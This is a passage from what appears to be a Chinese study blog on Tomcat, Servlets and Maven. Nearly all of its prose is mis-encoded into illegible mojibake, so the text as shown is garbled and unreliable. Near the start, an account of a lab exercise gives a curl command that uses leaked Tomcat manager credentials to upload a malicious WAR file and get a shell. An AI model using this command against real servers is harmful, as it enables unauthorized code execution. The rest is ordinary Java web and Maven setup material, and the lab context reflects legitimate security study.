æ¬¡çš„javaé¢˜ä¸­å‡ºç°çš„tomcatå¼±å¯†ç éƒ¨ç½²waræˆ–è€…tomcatå¯†ç æ³„éœ²,å‘½ä»¤è¡Œéƒ¨ç½²warçš„æƒ…å†µä¸€æ ·ã€‚</p><p>æ³¨æ„ä¸€ç‚¹,tomcatæ”¯æŒé€šè¿‡è¯·æ±‚urlè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚<br><code>http://{host}:{port}/manager/text/{command}?{parameters}</code></p><p>æ¯”å¦‚æˆ‘åšè¿‡çš„htbæŸé¶æœºä¸­,ç”¨æˆ·å¯†ç æ³„éœ²äº†ã€‚ä½†æ˜¯ç”¨æˆ·æ˜¯admin-gui,manager-scriptæƒé™,æˆ‘ä»¬æ²¡æ³•é€šè¿‡è´¦æˆ·å¯†ç ç™»å½•<code>manager/html</code>æ‰‹åŠ¨éƒ¨ç½²war.ä½†æ˜¯å´å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ¥éƒ¨ç½²war getshell.</p><pre><code class="bash">curl --user &#39;tomcat:xxxx&#39; --upload-file exp.war &quot;http://xxxx:8080/manager/text/deploy=/exp.war&quot;</code></pre><p>è¿™æ ·å°±å¯ä»¥é€šè¿‡è®¿é—®webç›®å½•expç›´æ¥æ“ä½œshelläº†ã€‚</p><ul><li>å®‰å…¨ç®¡ç†</li></ul><p>Java çš„ SecurityManager èƒ½è®© Web æµè§ˆå™¨åœ¨å®ƒè‡ªèº«çš„æ²™ç›’ä¸­è¿è¡Œå°å‹åº”ç”¨ï¼ˆappletï¼‰ï¼Œä»è€Œå…·æœ‰é˜²æ­¢ä¸å¯ä¿¡ä»£ç è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶ä»¥åŠé˜²æ­¢å…¶è¿æ¥åˆ°ä¸»æœºï¼Œè€Œä¸æ˜¯åŠ è½½è¯¥åº”ç”¨çš„ä½ç½®ã€‚<br>SecurityManager èƒ½é˜²æ­¢ä¸å¯ä¿¡çš„å°å‹åº”ç”¨åœ¨ä½ çš„æµè§ˆå™¨ä¸Šè¿è¡Œï¼Œè¿è¡Œ Tomcat æ—¶ï¼Œä½¿ç”¨ SecurityManager ä¹Ÿèƒ½ä¿æŠ¤æœåŠ¡å™¨ï¼Œä½¿å…¶å…å—æœ¨é©¬å‹çš„ appletã€JSPã€JSP Bean ä»¥åŠæ ‡ç­¾åº“çš„ä¾µå®³ï¼Œç”šè‡³ä¹Ÿå¯ä»¥é˜²æ­¢ç”±äºæ— æ„ä¸­çš„ç–å¿½æ‰€é€ æˆçš„é—®é¢˜ã€‚</p><p>å…³äºé€‚ç”¨äº Tomcat çš„æ ‡å‡†ç³»ç»Ÿ SecurityManager æƒé™ç±».åŒ…æ‹¬ä½†ä¸é™äºï¼š<br>1.java.lang.RuntimePermissionâ€”â€”æ§åˆ¶ä¸€äº›ç³»ç»Ÿ/è¿è¡Œæ—¶å‡½æ•°çš„ä½¿ç”¨ï¼Œæ¯”å¦‚ exit() å’Œ exec()ã€‚ å¦å¤–ä¹Ÿæ§åˆ¶åŒ…çš„è®¿é—®/å®šä¹‰ã€‚<br>2.java.io.FilePermissionâ€”â€”æ§åˆ¶å¯¹æ–‡ä»¶å’Œç›®å½•çš„è¯»/å†™/æ‰§è¡Œã€‚<br>3.java.security.AllPermissionâ€”â€”å…è®¸è®¿é—®ä»»ä½•æƒé™ï¼Œä»¿ä½›æ²¡æœ‰ SecurityManagerã€‚<br>â€¦â€¦</p><p>å…¶å¯¹åº”çš„ç­–ç•¥æ–‡ä»¶å°±æ˜¯catalina.policyã€‚</p><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servletç®—æ˜¯javawebæ¯”è¾ƒç‰¹è‰²çš„ç¨‹åºäº†ã€‚å®ƒæ˜¯ä½œä¸ºæ¥è‡ª Web æµè§ˆå™¨æˆ–å…¶ä»– HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚ä»æŸç§è§’åº¦è®²,ä»–èƒ½è·Ÿphpåšåˆ°çš„åŠŸèƒ½è¿‘ä¹ç±»ä¼¼ã€‚Java ç±»åº“çš„å…¨éƒ¨åŠŸèƒ½å¯¹ Servlet æ¥è¯´éƒ½æ˜¯å¯ç”¨çš„ã€‚å®ƒå¯ä»¥é€šè¿‡ sockets å’Œ RMI æœºåˆ¶ä¸ appletsã€æ•°æ®åº“æˆ–å…¶ä»–è½¯ä»¶è¿›è¡Œäº¤äº’ã€‚</p><ul><li>Life Cycle</li></ul><p>Servletçš„ç”Ÿå‘½å‘¨æœŸå¯è¢«å®šä¹‰ä¸ºä»åˆ›å»ºç›´åˆ°æ¯ç­çš„æ•´ä¸ªè¿‡ç¨‹ã€‚ä»¥ä¸‹æ˜¯ Servlet éµå¾ªçš„è¿‡ç¨‹ï¼š</p><p>1.é€šè¿‡è°ƒç”¨ init () æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ã€‚<br>2.è°ƒç”¨ service() æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚<br>3.é€šè¿‡è°ƒç”¨ destroy() æ–¹æ³•ç»ˆæ­¢ï¼ˆç»“æŸï¼‰ã€‚<br>æœ€åï¼ŒServlet æ˜¯ç”± JVM çš„åƒåœ¾å›æ”¶å™¨è¿›è¡Œåƒåœ¾å›æ”¶çš„ã€‚</p><p>init()å¯ç†è§£ä¸ºåˆå§‹åŒ–,ä½†ä¸æ˜¯æ„é€ æ–¹æ³•ã€‚(javaæ„é€ æ–¹æ³•å¿…é¡»æ˜¯è·Ÿç±»ååŒåçš„)ä¸€èˆ¬è¿›è¡Œç®€å•çš„å‚æ•°è®¾å®šã€‚</p><p>service()ç”¨æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚å¹¶å°†æ ¼å¼åŒ–çš„å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚æˆ‘ä»¬é€šå¸¸å¹¶ä¸éœ€è¦å¯¹è¿™ä¸ªæ–¹æ³•è¿›è¡Œæ”¹å–„,è€Œæ˜¯é‡å†™å…¶è°ƒç”¨çš„<code>doGet</code>,<code>doPost</code>ç­‰æ–¹æ³•ã€‚</p><p>doGet(),doPost()æ ¼å¼å‡å¦‚ä¸‹ï¼š</p><pre><code class="java">public void [doGet or doPost](HttpServletRequest request,HttpServletResponse response)    throws ServletException, IOException {    // Servlet code}</code></pre><p>destroy() æ–¹æ³•åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œåœ¨ Servlet ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶è¢«è°ƒç”¨ã€‚destroy() æ–¹æ³•å¯ä»¥è®©æ‚¨çš„ Servlet å…³é—­æ•°æ®åº“è¿æ¥ã€åœæ­¢åå°çº¿ç¨‹ã€æŠŠ Cookie åˆ—è¡¨æˆ–ç‚¹å‡»è®¡æ•°å™¨å†™å…¥åˆ°ç£ç›˜ï¼Œå¹¶æ‰§è¡Œå…¶ä»–ç±»ä¼¼çš„æ¸…ç†æ´»åŠ¨ã€‚<br>åœ¨è°ƒç”¨ destroy() æ–¹æ³•ä¹‹åï¼Œservlet å¯¹è±¡è¢«æ ‡è®°ä¸ºåƒåœ¾å›æ”¶</p><ul><li>éƒ¨ç½²</li></ul><p>è¿™ä¸€éƒ¨åˆ†åº”è¯¥ç®—æ˜¯webå¼€å‘çš„åŸºæœ¬æµç¨‹äº†,å› ä¸ºä»¥å‰åªæ˜¯å®¡è¿‡æºç ,æ‰€ä»¥åœ¨å®é™…ä½¿ç”¨ideaè¿›è¡Œé¡¹ç›®åˆ›å»ºä»¥åŠå†…å®¹ç¼–å†™ä¸Šè¿˜æ˜¯å¾—é‡æ–°æ¥è¿‡ã€‚</p><p>æµç¨‹:ideaåˆ›å»ºjavaEnterpriseé¡¹ç›®å¹¶é€‰æ‹©Additional Libraryä¸­çš„Web Application. =&gt; åœ¨æ–°å»ºé¡¹ç›®ä¸‹çš„web/WEB-INFç›®å½•ä¸‹æ–°å»ºlib,src,classesä¸‰ä¸ªæ–‡ä»¶å¤¹ =&gt; æ›´æ”¹é¡¹ç›®ç»“æ„ï¼š</p><p>1.src å¯ä»¥åœ¨Project Structureçš„modulesä¸­é‡æ–°è®¾ç½®source.æˆ‘ä»¬éœ€è¦æŠŠSourcesä»åŸå·¥ç¨‹çš„srcæ”¹ä¸ºWEB-INFä¸‹çš„src.Sources ä¸€èˆ¬ç”¨äºæ ‡æ³¨ç±»ä¼¼ src è¿™ç§å¯ç¼–è¯‘ç›®å½•ã€‚æœ‰æ—¶å€™æˆ‘ä»¬ä¸å•å•é¡¹ç›®çš„ src ç›®å½•è¦å¯ç¼–è¯‘ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›ç‰¹åˆ«çš„ç›®å½•ä¹Ÿè®¸æˆ‘ä»¬ä¹Ÿè¦ä½œä¸ºå¯ç¼–è¯‘çš„ç›®å½•ï¼Œå°±éœ€è¦å¯¹è¯¥ç›®å½•è¿›è¡Œæ­¤æ ‡æ³¨ã€‚åªæœ‰ Sources è¿™ç§å¯ç¼–è¯‘ç›®å½•æ‰å¯ä»¥æ–°å»º Java ç±»å’ŒåŒ…ã€‚(æ­¤å¤„å·¥ç¨‹è‡ªå·±åˆ›å»ºçš„srcæ²¡ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ”¹æˆwebç›®å½•ä¸‹çš„æºæ–‡ä»¶å¤¹)<br>2.classes ç”¨æ¥å­˜æ”¾ç¼–è¯‘åè¾“å‡ºçš„classæ–‡ä»¶.æˆ‘ä»¬åŒæ ·åœ¨é¡¹ç›®ç»“æ„ä¸­Pathsçš„é…ç½®é‡Œå°†Output pathå’ŒTest output pathéƒ½é€‰æ‹©åˆšåˆšåˆ›å»ºçš„classesæ–‡ä»¶å¤¹ã€‚<br>3.libç”¨äºå¤–éƒ¨jaråŒ…ã€‚ç”±äºæˆ‘ä»¬å¼€å‘æ—¶å¿…ç„¶ä¼šç”¨åˆ°å¤–éƒ¨ä¾èµ–,æ‰€ä»¥å­˜æ”¾jaråŒ…çš„libä¹Ÿéœ€è¦åœ¨é¡¹ç›®ä¸­è®¾ç½®ã€‚æˆ‘ä»¬åŒæ ·åœ¨modulesä¸­æŠŠlibæ·»åŠ ä¸ºjar directoryå³å¯ã€‚</p><p>ç„¶åæ˜¯é…ç½®tomcatæœåŠ¡å™¨,è¿™ä¸ªæ²¡å•¥å¥½è¯´çš„ã€‚ä¸è¿‡è¿˜æ˜¯è¦æ³¨æ„<code>artifact</code>è®¾ç½®æ ¹ç›®å½•çš„è¦ç‚¹ã€‚é€šå¸¸è®¾ç½®ä¸º<code>/</code>.</p><p>Servletç¼–å†™çš„ä¸€ä¸ªdemo.æˆ‘ä»¬é¦–å…ˆè¦åœ¨ä¹‹å‰æ›´æ”¹è¿‡çš„srcä¸‹æ–°å»ºä¸€ä¸ªclass<br>(è™½ç„¶ideaä¼šè‡ªåŠ¨æ¢æˆ.java)å‘½åéšæ„ã€‚ä¸è¿‡æœ€å¥½æ˜¯æŸæŸServlet.</p><pre><code class="java">import java.io.*;import javax.servlet.*;import javax.servlet.http.*;public class TestServlet extends HttpServlet{    private String quote;    public  TestServlet(){        System.out.println(&quot;TestServlet constructor called.&quot;);    }    @Override    public void init() throws ServletException {        System.out.println(&quot;TestServlet init method called&quot;);        quote=&quot;Thy will , not my will , be done.&quot;;    }    @Override    public void destroy() {        System.out.println(&quot;TestServlet destroy method called&quot;);    }    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {        resp.setContentType(&quot;json&quot;);        PrintWriter out=resp.getWriter();        out.println(&quot;{\&quot;quote\&quot;:\&quot;&quot;+quote+&quot;\&quot;}&quot;);    }}</code></pre><p>è¿™é‡Œé¡ºæ‰‹å†™äº†æ„é€ æ–¹æ³•çœ‹çœ‹è°ƒç”¨é¡ºåºã€‚è™½ç„¶æˆ‘ä»¬éƒ½çŸ¥é“æ„é€ æ–¹æ³•å¿…ç„¶æ˜¯æœ€å…ˆè°ƒç”¨çš„ï¼Œå…¶æ¬¡æ˜¯init(),ç„¶åæ˜¯æˆ‘ä»¬æ¯æ¬¡è®¿é—®æ—¶è°ƒç”¨çš„doGet,æœ€ådestroyé”€æ¯ã€‚</p><p>ç„¶åæˆ‘ä»¬build moduleã€‚åœ¨WEB-INFä¸‹çš„classesä¸­ç”ŸæˆTestServlet.class.æœ€åå°±æ˜¯é…ç½®web.xmläº†ã€‚</p><blockquote><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒServlet åº”ç”¨ç¨‹åºä½äºè·¯å¾„ <Tomcat-installation-directory>/webapps/ROOT ä¸‹ï¼Œä¸”ç±»æ–‡ä»¶æ”¾åœ¨ <Tomcat-installation-directory>/webapps/ROOT/WEB-INF/classes ä¸­ã€‚<br>å¦‚æœæœ‰ä¸€ä¸ªå®Œå…¨åˆæ ¼çš„ç±»åç§° com.myorg.MyServletï¼Œé‚£ä¹ˆè¿™ä¸ª Servlet ç±»å¿…é¡»ä½äº WEB-INF/classes/com/myorg/MyServlet.class ä¸­ã€‚ä½äº <Tomcat-installation-directory>/webapps/ROOT/WEB-INF/ çš„ web.xml æ–‡ä»¶ä¸­å¿…é¡»è®¾ç½®Servletçš„ç›¸å…³æ¡ç›®ã€‚</Tomcat-installation-directory></Tomcat-installation-directory></Tomcat-installation-directory></p></blockquote><p>æ‰€ä»¥è·¯å¾„ç»“æ„è§„å®šå…¶å®éå¸¸æ¸…æ™°ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦è®¾ç½®web.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;         version=&quot;4.0&quot;&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;test&lt;/servlet-name&gt;        &lt;servlet-class&gt;TestServlet&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;test&lt;/servlet-name&gt;        &lt;url-pattern&gt;/Test&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;&lt;/web-app&gt;</code></pre><p>å¯è®¾å®šå¯¹åº”çš„servlet-classå¹¶å®šä¹‰å…¶servletname.åŒæ—¶å¯ä»¥å®šä¹‰è¿™ä¸ªservletå¯¹åº”çš„urlæ˜ å°„ã€‚</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/21.PNG" class="lazyload" data-srcset="21.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å‰©ä¸‹çš„éƒ¨åˆ†å°±è·Ÿå…¶ä»–è¯­è¨€å·®ä¸å¤šäº†,ä½¿ç”¨get,postç­‰å¤„ç†å‚æ•°,cookieåŠç›¸åº”httpè¯·æ±‚ã€‚è¿™é‡Œç¨å¾®è®°å½•ä¸‹sqlè¿æ¥çš„ä½¿ç”¨æ–¹æ³•ã€‚</p><pre><code class="java">static final String JDBC_DRIVER = &quot;com.mysql.jdbc.Driver&quot;;  static final String DB_URL = &quot;jdbc:mysql://localhost:3306/test&quot;;static final String USER = &quot;root&quot;;static final String PASS = &quot;123456&quot;; ......Class.forName(&quot;com.mysql.jdbc.Driver&quot;);conn = DriverManager.getConnection(DB_URL,USER,PASS);......mt = conn.createStatement();String sql;sql = &quot;SELECT id, name, url FROM websites&quot;;ResultSet rs = stmt.executeQuery(sql);......rs.close();stmt.close();conn.close();</code></pre><h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><p>ä¹‹å‰ä½¿ç”¨ysoserialè·Ÿmarshalsecæ—¶æƒ³å¿…å¿…ç„¶ç”¨è¿‡mavenäº†ã€‚ä½†æ˜¯å®é™…ä¸Šmavençš„ä½œç”¨ç©¶ç«Ÿæ˜¯ä»€ä¹ˆè¿˜æ˜¯ä¸€å¤´é›¾æ°´ã€‚å› æ­¤é’ˆå¯¹mavenä¹Ÿæ¥å­¦ä¹ ä¸‹ã€‚</p><ul><li>what is maven<br>Maven ç¿»è¯‘ä¸ºâ€ä¸“å®¶â€ã€â€å†…è¡Œâ€ï¼Œæ˜¯ Apache ä¸‹çš„ä¸€ä¸ªçº¯ Java å¼€å‘çš„å¼€æºé¡¹ç›®ã€‚åŸºäºé¡¹ç›®å¯¹è±¡æ¨¡å‹ï¼ˆç¼©å†™ï¼šPOMï¼‰æ¦‚å¿µï¼ŒMavenåˆ©ç”¨ä¸€ä¸ªä¸­å¤®ä¿¡æ¯ç‰‡æ–­èƒ½ç®¡ç†ä¸€ä¸ªé¡¹ç›®çš„æ„å»ºã€æŠ¥å‘Šå’Œæ–‡æ¡£ç­‰æ­¥éª¤ã€‚</li></ul><p>Maven æ˜¯ä¸€ä¸ªé¡¹ç›®ç®¡ç†å·¥å…·ï¼Œå¯ä»¥å¯¹ Java é¡¹ç›®è¿›è¡Œæ„å»ºã€ä¾èµ–ç®¡ç†ã€‚</p><p>ç¯å¢ƒé…ç½®åªè¦jdk+ä¸‹è½½mavenå³å¯ã€‚å½“ç„¶æˆ‘è®°å¾—IDEAåº”è¯¥æ˜¯æœ‰mavençš„åŠŸèƒ½çš„ã€‚</p><ul><li>POM</li></ul><p>POM å³ project object model.æ˜¯ä¸€ä¸ªxmlæ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿæ˜¯mavenå·¥ç¨‹çš„åŸºæœ¬å•å…ƒã€‚åŒ…å«äº†é¡¹ç›®çš„åŸºæœ¬ä¿¡æ¯ï¼Œç”¨äºæè¿°é¡¹ç›®å¦‚ä½•æ„å»ºï¼Œå£°æ˜é¡¹ç›®ä¾èµ–ï¼Œç­‰ç­‰ã€‚</p><p>ä¸€ä¸ªpom.xmlçš„demo</p><pre><code class="xml">&lt;project xmlns = &quot;http://maven.apache.org/POM/4.0.0&quot;    xmlns:xsi = &quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xsi:schemaLocation = &quot;http://maven.apache.org/POM/4.0.0    http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;!-- æ¨¡å‹ç‰ˆæœ¬ --&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;!-- å…¬å¸æˆ–è€…ç»„ç»‡çš„å”¯ä¸€æ ‡å¿—ï¼Œå¹¶ä¸”é…ç½®æ—¶ç”Ÿæˆçš„è·¯å¾„ä¹Ÿæ˜¯ç”±æ­¤ç”Ÿæˆï¼Œ å¦‚com.companyname.project-groupï¼Œmavenä¼šå°†è¯¥é¡¹ç›®æ‰“æˆçš„jaråŒ…æ”¾æœ¬åœ°è·¯å¾„ï¼š/com/companyname/project-group --&gt;    &lt;groupId&gt;com.companyname.project-group&lt;/groupId&gt;    &lt;!-- é¡¹ç›®çš„å”¯ä¸€IDï¼Œä¸€ä¸ªgroupIdä¸‹é¢å¯èƒ½å¤šä¸ªé¡¹ç›®ï¼Œå°±æ˜¯é artifactIdæ¥åŒºåˆ†çš„ --&gt;    &lt;artifactId&gt;project&lt;/artifactId&gt;    &lt;!-- ç‰ˆæœ¬å· --&gt;    &lt;version&gt;1.0&lt;/version&gt;&lt;/project&gt;</code></pre><p>å¸¸è§çš„èŠ‚ç‚¹ç†è§£</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/22.PNG" class="lazyload" data-srcset="22.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>Super POM<blockquote><p>çˆ¶ï¼ˆSuperï¼‰POMæ˜¯ Maven é»˜è®¤çš„ POMã€‚æ‰€æœ‰çš„ POM éƒ½ç»§æ‰¿è‡ªä¸€ä¸ªçˆ¶ POMï¼ˆæ— è®ºæ˜¯å¦æ˜¾å¼å®šä¹‰äº†è¿™ä¸ªçˆ¶ POMï¼‰ã€‚çˆ¶ POM åŒ…å«äº†ä¸€äº›å¯ä»¥è¢«ç»§æ‰¿çš„é»˜è®¤è®¾ç½®ã€‚å› æ­¤ï¼Œå½“ Maven å‘ç°éœ€è¦ä¸‹è½½ POM ä¸­çš„ ä¾èµ–æ—¶ï¼Œå®ƒä¼šåˆ° Super POM ä¸­é…ç½®çš„é»˜è®¤ä»“åº“ <a href="http://repo1.maven.org/maven2" target="_blank" rel="noopener">http://repo1.maven.org/maven2</a> å»ä¸‹è½½ã€‚</p></blockquote></li></ul><p>æ›´å¤špomæ ‡ç­¾çš„å«ä¹‰åœ¨é‡åˆ°å®é™…æƒ…å†µå†ä½œè¯´æ˜ã€‚</p><ul><li>Life Cycle</li></ul><p>Maven æ„å»ºç”Ÿå‘½å‘¨æœŸå®šä¹‰äº†ä¸€ä¸ªé¡¹ç›®æ„å»ºè·Ÿå‘å¸ƒçš„è¿‡ç¨‹.å…¶ä¸»è¦çš„ä¸‰ä¸ªç”Ÿå‘½å‘¨æœŸæ˜¯<code>clean</code>,<code>default/build</code>,<code>site</code>.</p><p>å¸¸ç”¨å‘½ä»¤å¦‚<code>mvn clean</code>æ‰§è¡Œçš„å…¶å®æ˜¯ä¸¤ä¸ªç”Ÿå‘½å‘¨æœŸé˜¶æ®µ<code>pre-clean,clean</code>.æ¢æˆ<code>mvn post-clean</code>åˆ™ä¼šéƒ½æ‰§è¡Œä¸€éå³ä¸‰ä¸ªé˜¶æ®µã€‚</p><pre><code>pre-cleanï¼šæ‰§è¡Œä¸€äº›éœ€è¦åœ¨cleanä¹‹å‰å®Œæˆçš„å·¥ä½œcleanï¼šç§»é™¤æ‰€æœ‰ä¸Šä¸€æ¬¡æ„å»ºç”Ÿæˆçš„æ–‡ä»¶post-cleanï¼šæ‰§è¡Œä¸€äº›éœ€è¦åœ¨cleanä¹‹åç«‹åˆ»å®Œæˆçš„å·¥ä½œ</code></pre><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶pom.xmlæ¥å†³å®šmvn cleanæ—¶æ¯ä¸ªé˜¶æ®µçš„åŠ¨ä½œã€‚</p><ul><li>maven repos</li></ul><p>mavenä»“åº“æ˜¯é¡¹ç›®ä¸­ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“ã€‚å…¶ä¸»è¦æ˜¯å­˜å‚¨jarçš„åœ°æ–¹ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„å»ºæœ¬åœ°çš„mavené¡¹ç›®ã€‚å½“ç„¶ä¹Ÿå¯ä»¥æœ‰è¿œç¨‹ä¸é»˜è®¤çš„ä»“åº“ã€‚</p><p>æ¯”å¦‚ä½¿ç”¨aliyunä»“åº“ã€‚æˆ‘ä»¬å¯ä»¥åœ¨mavençš„settingä¸­æ›´æ”¹setting.xmlæ·»åŠ èŠ‚ç‚¹ã€‚</p><pre><code class="xml">&lt;mirrors&gt;    &lt;mirror&gt;      &lt;id&gt;alimaven&lt;/id&gt;      &lt;name&gt;aliyun maven&lt;/name&gt;      &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;            &lt;/mirror&gt;&lt;/mirrors&gt;</code></pre><p>pom.xmlä¸­æ·»åŠ </p><pre><code class="xml">&lt;repositories&gt;          &lt;repository&gt;              &lt;id&gt;alimaven&lt;/id&gt;              &lt;name&gt;aliyun maven&lt;/name&gt;              &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;              &lt;releases&gt;                  &lt;enabled&gt;true&lt;/enabled&gt;              &lt;/releases&gt;              &lt;snapshots&gt;                  &lt;enabled&gt;false&lt;/enabled&gt;              &lt;/snapshots&gt;          &lt;/repository&gt;  &lt;/repositories&gt;</code></pre><p>è¿™ä¸ªå¯èƒ½ç®—æ˜¯æ¯”è¾ƒé‡è¦çš„ä¸€ç‚¹äº†ã€‚å› ä¸ºå¤§éƒ¨åˆ†ideaè‡ªå¸¦çš„mavenæˆ–è€…æ˜¯é»˜è®¤ä¸‹è½½çš„mavené…ç½®ä¸­settings.xmléƒ½ä¼šå»å›½å¤–ä»“åº“è·å–èµ„æºï¼Œå¯¼è‡´é€Ÿåº¦å¥‡æ…¢ã€‚</p><ul><li>develop</li></ul><p>ä¸‹é¢å°±å¯ä»¥å¼€å§‹æ­£å¼mavené¡¹ç›®çš„å¼€å‘äº†ã€‚ä¼¼ä¹ideaç›´æ¥åˆ›é€ maven projectæœ‰ä¸€äº›å‘è¦è¸©ã€‚æ‰€ä»¥æˆ‘å…ˆæŒ‰ç…§èœé¸Ÿæ•™ç¨‹ä¸Šçš„èµ°ã€‚</p><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œå…ˆç¡®è®¤æŠŠä»“åº“çš„è®¾ç½®æ”¹å¥½äº†ã€‚å³é€‰æ‹©äº†aliyuné•œåƒ.ç„¶åideaçš„é…ç½®ä¸­:<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/23.PNG" class="lazyload" data-srcset="23.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åç”¨å‘½ä»¤è¡Œæ„å»ºä¸€ä¸ªé¡¹ç›®ã€‚æ­¤å¤„æˆ‘å‘½å‘½ä¸ºmaven_learning</p><pre><code>mvn archetype:generate &quot;-DgroupId=com.byc.test&quot; &quot;-DartifactId=mvn_learning&quot; &quot;-DarchetypeArtifactId=maven-archetype-quickstart&quot; &quot;-DinteractiveMode=false&quot;</code></pre><p>ä¹‹ååœ¨ideaä¸­å¯¼å…¥è¿™ä¸ªå·¥ç¨‹å³å¯ã€‚<br>ç›®å½•ç»“æ„<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/24.PNG" class="lazyload" data-srcset="24.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>testè·Ÿjavaåˆ†åˆ«æ˜¯javaä»£ç æ–‡ä»¶è·Ÿæµ‹è¯•ä»£ç æ–‡ä»¶ã€‚éƒ½åœ¨åŒ…ç»“æ„ä¸‹ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬åˆå§‹çš„pom.xmlä¸­ä¸»è¦æ˜¯è¿™æ ·çš„å†…å®¹</p><pre><code class="xml">&lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;junit&lt;/groupId&gt;      &lt;artifactId&gt;junit&lt;/artifactId&gt;      &lt;version&gt;3.8.1&lt;/version&gt;      &lt;scope&gt;test&lt;/scope&gt;    &lt;/dependency&gt;  &lt;/dependencies&gt;</code></pre><p>è¯´æ˜Maven å·²ç»æ·»åŠ äº† JUnit ä½œä¸ºæµ‹è¯•æ¡†æ¶</p><p>åˆå§‹çš„App.javaæ˜¯ä¸€ä¸ªHello worldçš„ç”¨ä¾‹</p><pre><code class="java">package com.byc.test;/** * Hello world! * */public class App {    public static void main( String[] args )    {        System.out.println( &quot;Hello World!&quot; );    }}</code></pre><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦build mavené¡¹ç›®ã€‚ä½¿ç”¨clean package</p><pre><code>mvn clean package</code></pre><p>æˆåŠŸåã€‚æˆ‘ä»¬ä¼šå‘ç°ç”Ÿæˆäº†targetæ–‡ä»¶å¤¹ã€‚å¹¶ä¸”å…¶ä¸­æœ‰æˆ‘ä»¬é¡¹ç›®æ„å»ºçš„jar fileã€‚<br>æ–°å¢ç›®å½•ç»“æ„</p><pre><code>æˆ‘ä»¬ç»™äº† maven ä¸¤ä¸ªç›®æ ‡ï¼Œé¦–å…ˆæ¸…ç†ç›®æ 